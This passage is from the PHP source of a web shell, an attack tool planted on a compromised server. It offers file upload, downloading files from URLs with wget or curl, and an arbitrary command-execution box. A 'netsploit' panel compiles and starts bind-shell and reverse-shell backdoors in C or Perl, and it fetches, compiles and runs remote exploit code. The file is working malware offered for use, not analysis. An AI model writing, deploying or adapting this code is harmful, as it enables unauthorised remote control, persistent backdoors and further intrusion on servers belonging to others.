                        editorContent.value = result;
                        editorContent.dispatchEvent(new Event('input'));
                    }
                });
            }
            
            setTimeout(updatePushButton, 200);
        })();
        </script>
        <?php
    } 
    elseif(isset($_GET['x']) && ($_GET['x'] == 'upload')){
        if(isset($_POST['uploadcomp'])){
            if(is_uploaded_file($_FILES['file']['tmp_name'])){
                $path = magicboom($_POST['path']);
                $fname = $_FILES['file']['name'];
                $tmp_name = $_FILES['file']['tmp_name'];
                $pindah = $path.$fname;
                $stat = @move_uploaded_file($tmp_name,$pindah);
                if ($stat) {
                     $msg = "Uploaded to $pindah";
                }
                else $msg = "Failed";
            }
            else $msg = "No file";
        }
        elseif(isset($_POST['uploadurl'])){
            $pilihan = trim($_POST['pilihan']);
            $wurl = trim($_POST['wurl']);
            $path = magicboom($_POST['path']);
            $namafile = download($pilihan,$wurl);
            $pindah = $path.$namafile;
            if(is_file($pindah)) {
                $msg = "Downloaded to $pindah";
            }
            else $msg = "Failed";
        }
    ?>
        <form action="?y=<?php echo $pwd; ?>&amp;x=upload" enctype="multipart/form-data" method="post">
            <table class="tabnet">
                <tr><th>Upload from Computer</th></tr>
                <tr><td><input style="color:#222;width:100%;padding:6px;" type="file" name="file" /></td></tr>
                <tr><td><input class="inputz w-full" type="text" name="path" value="<?php echo $pwd; ?>" /></td></tr>
                <tr><td><input class="inputzbut" style="width:100%;" type="submit" name="uploadcomp" value="Upload" /></td></tr>
            </table>
        </form>
        <form method="post" action="?y=<?php echo $pwd; ?>&amp;x=upload">
            <table class="tabnet">
                <tr><th>Upload from URL</th></tr>
                <tr><td><input class="inputz w-full" type="text" name="wurl" value="http://example.com/file" /></td></tr>
                <tr><td><input class="inputz w-full" type="text" name="path" value="<?php echo $pwd; ?>" /></td></tr>
                <tr><td>
                    <select class="inputz" style="width:100%;" name="pilihan">
                        <option value="wwget">wget</option>
                        <option value="wcurl">curl</option>
                        <option value="wget">GET</option>
                        <option value="wlynx">lynx</option>
                        <option value="wlinks">links</option>
                        <option value="wfetch">fetch</option>
                        <option value="wfread">fread</option>
                    </select>
                </td></tr>
                <tr><td><input class="inputzbut" style="width:100%;" type="submit" name="uploadurl" value="Download" /></td></tr>
            </table>
        </form>
        <div style="text-align:center;margin:4px;font-size:14px;"><?php echo $msg; ?></div>
    <?php
    }
    elseif(isset($_GET['x']) && ($_GET['x'] == 'netsploit')){
        if (isset($_POST['bind']) && !empty($_POST['port']) && !empty($_POST['bind_pass']) && ($_POST['use'] == 'C')) {
            $port = trim($_POST['port']);
            $passwrd = trim($_POST['bind_pass']);
            tulis("bdc.c",$port_bind_bd_c);
            exe("gcc -o bdc bdc.c");
            exe("chmod 777 bdc");
            @unlink("bdc.c");
            exe("./bdc ".$port." ".$passwrd." &");
            $scan = exe("ps aux");
            if(eregi("./bdc $por",$scan)){ $msg = "Backdoor running"; }
            else { $msg = "Not running"; }
        }
        elseif (isset($_POST['bind']) && !empty($_POST['port']) && !empty($_POST['bind_pass']) && ($_POST['use'] == 'Perl')) {
            $port = trim($_POST['port']);
            $passwrd = trim($_POST['bind_pass']);
            tulis("bdp",$port_bind_bd_pl);
            exe("chmod 777 bdp");
            $p2=which("perl");
            exe($p2." bdp ".$port." &");
            $scan = exe("ps aux");
            if(eregi("$p2 bdp $port",$scan)){ $msg = "Backdoor running"; }
            else { $msg = "Not running"; }
        }
        elseif (isset($_POST['backconn']) && !empty($_POST['backport']) && !empty($_POST['ip']) && ($_POST['use'] == 'C')) {
            $ip = trim($_POST['ip']);
            $port = trim($_POST['backport']);
            tulis("bcc.c",$back_connect_c);
            exe("gcc -o bcc bcc.c");
            exe("chmod 777 bcc");
            @unlink("bcc.c");
            exe("./bcc ".$ip." ".$port." &");
            $msg = "Connecting to ".$ip.":".$port." ...";
        }
        elseif (isset($_POST['backconn']) && !empty($_POST['backport']) && !empty($_POST['ip']) && ($_POST['use'] == 'Perl')) {
            $ip = trim($_POST['ip']);
            $port = trim($_POST['backport']);
            tulis("bcp",$back_connect);
            exe("chmod +x bcp");
            $p2=which("perl");
            exe($p2." bcp ".$ip." ".$port." &");
            $msg = "Connecting to ".$ip.":".$port." ...";
        }
        elseif (isset($_POST['expcompile']) && !empty($_POST['wurl']) && !empty($_POST['wcmd']))
        {
            $pilihan = trim($_POST['pilihan']);
            $wurl = trim($_POST['wurl']);
            $namafile = download($pilihan,$wurl);
            if(is_file($namafile)) {
                $msg = exe($wcmd);
            }
            else $msg = "File not found: $namafile";
        }
    ?>
        <table class="tabnet">
            <tr><th>Bind</th><th>Back</th><th>Exploit</th></tr>
            <tr>
            <td style="padding:6px;">
            <form method="post">
                <input class="inputz w-full" type="text" name="port" placeholder="Port" value="<?php echo $bindport; ?>" />
                <input class="inputz w-full" type="text" name="bind_pass" placeholder="Password" value="<?php echo $bindport_pass; ?>" />
                <select class="inputz w-full" name="use"><option value="Perl">Perl</option><option value="C">C</option></select>
                <input class="inputzbut w-full" type="submit" name="bind" value="Bind" />
            </form>
            </td>
            <td style="padding:6px;">
            <form method="post">
                <input class="inputz w-full" type="text" name="ip" placeholder="IP" value="<?php echo ((getenv('REMOTE_ADDR')) ? (getenv('REMOTE_ADDR')) : ("127.0.0.1")); ?>" />
                <input class="inputz w-full" type="text" name="backport" placeholder="Port" value="<?php echo $bindport; ?>" />
                <select class="inputz w-full" name="use"><option value="Perl">Perl</option><option value="C">C</option></select>
                <input class="inputzbut w-full" type="submit" name="backconn" value="Connect" />
            </form>
            </td>
            <td style="padding:6px;">
            <form method="post">
                <input class="inputz w-full" type="text" name="wurl" placeholder="URL" value="http://example.com/exploit.c" />
                <input class="inputz w-full" type="text" name="wcmd" placeholder="Command" value="gcc -o exp exp.c;./exp" />
                <select class="inputz w-full" name="pilihan">
                    <option value="wwget">wget</option>
                    <option value="wcurl">curl</option>
                    <option value="wget">GET</option>
                    <option value="wfread">fread</option>
                </select>
                <input class="inputzbut w-full" type="submit" name="expcompile" value="Run" />
            </form>
            </td>
            </tr>
        </table>
        <div style="text-align:center;margin:4px;font-size:14px;color:#0066cc;word-break:break-all;"><?php echo $msg; ?></div>
    <?php
    }
    elseif(isset($_GET['x']) && ($_GET['x'] == 'shell')){
    ?>
        <form action="?y=<?php echo $pwd; ?>&amp;x=shell" method="post">
            <textarea class="output" readonly style="height:350px;"><?php
            if(isset($_POST['submitcmd'])) {
                echo @exe($_POST['cmd']);
            }
            ?></textarea>
            <div class="cmd-row mt-2">
                <span style="font-size:12px;color:#666;flex-shrink:0;"><?php echo $prompt; ?></span>
                <input onMouseOver="this.focus();" id="cmd" class="inputz" type="text" name="cmd" placeholder="command..." value="" />
                <input class="inputzbut" type="submit" value="▶" name="submitcmd" />
            </div>
        </form>
    <?php
    }
    elseif(isset($_GET['x']) && ($_GET['x'] == 'github')){
        if(isset($_POST['save_github_token'])){
            $token = trim($_POST['github_token']);
            $repo = trim($_POST['github_repo']);
            $branch = trim($_POST['github_branch']);
            $server_path = trim($_POST['github_server_path']);
            $github_path = trim($_POST['github_path']);
            ?>
            <script>
            localStorage.setItem('f7p_gh_token_9x7k2m', '<?php echo addslashes($token); ?>');
            localStorage.setItem('f7p_gh_repo_9x7k2m', '<?php echo addslashes($repo); ?>');
            localStorage.setItem('f7p_gh_branch_9x7k2m', '<?php echo addslashes($branch); ?>');
            localStorage.setItem('f7p_gh_server_path_9x7k2m', '<?php echo addslashes($server_path); ?>');
            localStorage.setItem('f7p_gh_path_9x7k2m', '<?php echo addslashes($github_path); ?>');
            window.location.href = '?y=<?php echo $pwd; ?>&x=github&saved=1';
            </script>
            <?php
            exit;
        }
        ?>
        <div style="max-width:600px;margin:0 auto;">
            <h2 style="color:#0066cc;margin-bottom:16px;">GitHub API Settings <small>(saved on localStorage)</small></h2>
            <?php if(isset($_GET['saved'])): ?>
            <div style="background:#e6f7e6;padding:12px;border-radius:6px;margin-bottom:16px;color:#006600;">Settings saved successfully!</div>
            <?php endif; ?>
            
            <form method="post" action="?y=<?php echo $pwd; ?>&x=github">
                <table class="tabnet">
                    <tr>
                        <td style="width:120px;">Token</td>
                        <td><input class="inputz w-full" type="password" name="github_token" placeholder="ghp_xxxxxxxxxxxx" id="github_token" /></td>
                    </tr>
                    <tr>
                        <td>Repository</td>
                        <td><input class="inputz w-full" type="text" name="github_repo" placeholder="username/repo" id="github_repo" /></td>
                    </tr>
                    <tr>
                        <td>Branch</td>
                        <td><input class="inputz w-full" type="text" name="github_branch" placeholder="main" id="github_branch" value="main" /></td>
                    </tr>
                    <tr>
                        <td style="vertical-align:top;padding-top:12px;">GitHub Dir</td>
                        <td>
                            <input class="inputz w-full" type="text" name="github_path" placeholder="buku" id="github_path" />
                            <div style="font-size:12px;color:#666;margin-top:4px;">
                                Directory in Your Repository
                            </div>
                        </td>
                    </tr>
                    <tr>
                        <td style="vertical-align:top;padding-top:12px;">Server Path</td>
                        <td>
                            <input class="inputz w-full" type="text" name="github_server_path" placeholder="/home/vol13_7/.../htdocs/p/" id="github_server_path" />
                            <div style="font-size:12px;color:#666;margin-top:4px;">
                                Full Directory link in this server
                            </div>
                        </td>
                    </tr>
                    <tr>
                        <td colspan="2" style="text-align:center;">
                            <input class="inputzbut" type="submit" name="save_github_token" value="Save Settings" style="width:100%;" />
                        </td>
                    </tr>
                </table>
            </form>
        <script>
        document.addEventListener('DOMContentLoaded', function() {
            var token = localStorage.getItem('f7p_gh_token_9x7k2m');
            var repo = localStorage.getItem('f7p_gh_repo_9x7k2m');
            var branch = localStorage.getItem('f7p_gh_branch_9x7k2m');
            var serverPath = localStorage.getItem('f7p_gh_server_path_9x7k2m');
            var githubPath = localStorage.getItem('f7p_gh_path_9x7k2m');
            var currentDir = '<?php echo $pwd; ?>';
            
            var configHtml = '';
            if (token) {
                configHtml += 'Token: ' + token.substring(0, 10) + '... ';
                document.getElementById('github_token').value = token;
                document.getElementById('github_token').type = 'text';
            } else {
                configHtml += 'Token not set ';
            }
            
            if (repo) {
                configHtml += '| Repo: ' + repo + ' ';
                document.getElementById('github_repo').value = repo;
            }
            
            if (branch) {
                configHtml += '| Branch: ' + branch + ' ';
                document.getElementById('github_branch').value = branch;
            }
            
            if (serverPath) {
                configHtml += '| Server: ' + serverPath;
                document.getElementById('github_server_path').value = serverPath;
            }
            
            if (githubPath) {
                configHtml += '| GitHub: ' + githubPath;
                document.getElementById('github_path').value = githubPath;
            }
            
            document.getElementById('current_config').innerHTML = configHtml || 'No configuration found';
            
            var serverPathInput = document.getElementById('github_server_path');
            if (!serverPath && currentDir) {
                serverPathInput.placeholder = 'Suggested: ' + currentDir;
            }
            
            setTimeout(function() {
                updatePaths();
                initPushButton();
            }, 300);
        });

        </script>
        <?php
    }
    else {
        $buff = showdir($pwd,$prompt);
        echo $buff;
    }
    ?>
    </div>

    <div id="footer">
        <span class="footer-item">
            <?php
            $os = strtolower(substr($system,0,3)) == "win" ? "🪟" : "🐧";
            echo $os;
            ?>
        </span>
        <span class="footer-item"> <span class="gaya"><?php echo $server_ip; ?></span></span>
        <span class="footer-item"><?php echo $system; ?></span>
    </div>
<script>
</body>
</html>